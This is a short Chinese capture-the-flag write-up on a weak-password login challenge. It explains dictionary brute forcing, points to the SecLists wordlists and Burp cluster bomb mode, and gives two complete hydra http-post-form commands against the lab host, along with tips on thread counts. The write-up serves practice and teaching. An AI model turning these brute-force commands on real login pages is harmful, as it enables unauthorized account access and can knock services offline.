# 解题思路
看到网页猜测此题可能采用弱口令爆破的方式。

弱口令，可以理解为简单的密码，比如123456，大部分用户会将手机号码，生日，姓名字母缩写作为密码，这也就是弱口令。

弱口令字典，就是包括了一些常见的弱口令和根据特征信息生成的密码（比如你的生日、手机号）。

爆破，就是在工具中导入字典，不断尝试利用字典里的密码去登录，直到返回成功登录的结果。

此题用户名和密码均未知，考虑到用bp里的集束炸弹模式进行攻击

我用到的字典：https://github.com/danielmiessler/SecLists

解题思路：尝试弱口令爆破，我先用bp把常用用户名和密码字典试过之后，未能成功，扫描发现题目中含有一个www.zip,解压后是hello.txt里面是用户名和密码的字典,组合太多，所以我选择用hydra来尝试

抓包确认字段名为 username和password



<img src="https://cdn.nlark.com/yuque/0/2026/jpeg/73090803/1793250148444-f8fabcf0-447e-48ab-b578-497ca96c9e68.jpeg" width="532.5" title="" crop="0,0,1,1" id="u414985f7" class="ne-image">

在mac终端使用hydra进行抓包

```bash
/opt/homebrew/bin/hydra -L ~/Desktop/hello.txt -P ~/Desktop/hello.txt -s 20925 -V -t 4 -W 1 -f node1.anna.nssnode.cn http-post-form "/:username=^USER^&password=^PASS^:F=账号或密码错误"
```

<img src="https://cdn.nlark.com/yuque/0/2026/png/73090803/1793249987147-2ce5dd6b-37de-4c23-b8f8-ebb4400cd9d9.png" width="2924" title="" crop="0,0,1,1" id="u560bcd11" class="ne-image">

加入-f，找到正确组合就立即停止，节约时间

如果觉得太慢可以把线程换成8

```bash
/opt/homebrew/bin/hydra -L ~/Desktop/hello.txt -P ~/Desktop/hello.txt -s 20925 -V -t 8 -f node1.anna.nssnode.cn http-post-form "/:username=^USER^&password=^PASS^:F=账号或密码错误"
```

切到16线程会把靶机打挂
